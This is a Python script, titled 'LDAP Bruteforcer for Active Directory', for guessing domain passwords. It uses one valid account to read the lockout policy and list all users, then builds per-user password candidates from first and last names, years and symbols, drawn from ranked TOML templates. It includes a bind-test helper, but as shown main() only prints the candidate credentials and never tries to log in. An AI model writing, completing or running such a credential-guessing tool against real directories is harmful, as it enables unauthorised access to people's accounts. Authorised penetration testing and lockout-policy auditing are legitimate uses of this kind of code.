import argparse
import re
import toml
from ldap3 import Server, Connection, ALL
from ldap3.core.exceptions import LDAPBindError
from typing import List, Dict
import os

def get_default_naming_context(server, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    conn.search('', '(objectClass=*)', search_scope='BASE', attributes=['defaultNamingContext'])
    return conn.entries[0]['defaultNamingContext'].value

def get_lockout_policy(server, base_dn, domain, user, password):
    conn = Connection(server, user=f"{domain}\\{user}", password=password, auto_bind=True, authentication='NTLM')
    conn.search(base_dn, '(objectClass=domain)', attributes=['lockoutDuration', 'lockoutObservationWindow', 'minPwdLength'])
    entry = conn.entries[0]
    return {
        'lockoutDuration': int(entry['lockoutDuration'].value),
        'lockoutObservationWindow': int(entry['lockoutObservationWindow'].value),
        'minPwdLength': int(entry['minPwdLength'].value)
    }

def enumerate_user_attributes(server, base_dn, user, password):
    conn = Connection(server, user=user, password=password, auto_bind=True)
    conn.search(
        search_base=base_dn,
        search_filter='(&(objectCategory=person)(objectClass=user))',
        attributes=['sAMAccountName', 'givenName', 'sn']
    )
    return [
        {
            'sAMAccountName': entry['sAMAccountName'].value,
            'givenName': entry['givenName'].value if 'givenName' in entry else '',
            'sn': entry['sn'].value if 'sn' in entry else ''
        }
        for entry in conn.entries if 'sAMAccountName' in entry
    ]

def filter_users(user_attrs: List[Dict], exclude_regexes: List[str]) -> List[Dict]:
    patterns = [re.compile(rgx, re.IGNORECASE) for rgx in exclude_regexes]
    filtered = []
    for user in user_attrs:
        name = user['sAMAccountName']
        if any(p.search(name) for p in patterns):
            continue
        filtered.append(user)
    return filtered

def try_bind(server, domain, username, password):
    try:
        conn = Connection(server, user=f'{domain}\\{username}', password=password, auto_bind=True)
        return True
    except LDAPBindError:
        return False

def generate_passwords_from_toml(config_path, user_attributes, min_length):
    if os.path.isfile(config_path):
        config = toml.load(config_path)
    else:
        # Try script directory
        script_dir = os.path.dirname(os.path.realpath(__file__))
        alt_path = os.path.join(script_dir, config_path)
        if os.path.isfile(alt_path):
            config = toml.load(alt_path)
        else:
            raise FileNotFoundError(f"Could not find the TOML configuration file: {config_path}")
    passwords = []

    for key, entry in config.items():
        template = entry.get("template", "")
        importance = entry.get("importance", 0)
        years = entry.get("year", [])
        symbols = entry.get("symbols", [""])

        if not isinstance(years, list):
            years = [str(years)]

        username = user_attributes.get("sAMAccountName", "")
        first_name = user_attributes.get("givenName", "")
        last_name = user_attributes.get("sn", "")

        if not first_name:
            continue

        first_char_cap = first_name[0].upper() + first_name[1:] if len(first_name) > 1 else first_name.upper()
        last_char_cap = last_name[0].upper() + last_name[1:] if len(last_name) > 1 else last_name.upper()

        for year in years:
            for symbol in symbols:
                pw = template
                pw = pw.replace("{username}", username)
                pw = pw.replace("{first_name_first_char_capitalized}", first_char_cap)
                pw = pw.replace("{last_name_first_char_capitalized}", last_char_cap)
                pw = pw.replace("{year}", str(year))
                pw = pw.replace("{symbol}", symbol)
                if len(pw) >= min_length:
                    passwords.append((importance, pw))

    return [pw for _, pw in sorted(passwords, key=lambda x: -x[0])]

def main():
    parser = argparse.ArgumentParser(description='LDAP Bruteforcer for Active Directory')
    parser.add_argument('--host', required=True, help='IP or hostname of the LDAP server')
    parser.add_argument('--domain', required=True, help='AD domain name (e.g., CONTOSO)')
    parser.add_argument('--valid-user', required=True, help='A known valid domain user (for querying policies)')
    parser.add_argument('--valid-pass', required=True, help='Password of the valid domain user')
    parser.add_argument('--exclude-regex', nargs='*', default=["MSOL.*", "service.*", "svc.*", "HealthBox.*"], help='Regex patterns to exclude usernames')
    parser.add_argument('--patterns', default='patterns.toml', help='TOML file containing password generation patterns')
    parser.add_argument('--only-show-generated-passwords', action='store_true', help='Only print generated passwords without attempting login')
    args = parser.parse_args()

    server = Server(args.host, get_info=ALL)
    base_dn = get_default_naming_context(server, args.domain, args.valid_user, args.valid_pass)
    policy = get_lockout_policy(server, base_dn, args.domain, args.valid_user, args.valid_pass)

    print(f"[*] Lockout Duration: {policy['lockoutDuration']}")
    print(f"[*] Minimum Password Length: {policy['minPwdLength']}")
    print("[*] Enumerating users...")

    user_attrs = enumerate_user_attributes(server, base_dn, args.valid_user, args.valid_pass)
    print(f"[*] Found {len(user_attrs)} users before filtering")

    filtered_users = filter_users(user_attrs, args.exclude_regex)
    print(f"[*] {len(filtered_users)} users remaining after filtering")

    for user in filtered_users:
        print(f" - {user['sAMAccountName']}")
        passwords = generate_passwords_from_toml(args.patterns, user, policy['minPwdLength'])
        if args.only_show_generated_passwords:
            for pw in passwords:
                print(f"{user['sAMAccountName']}:{pw}")

if __name__ == '__main__':
    main()
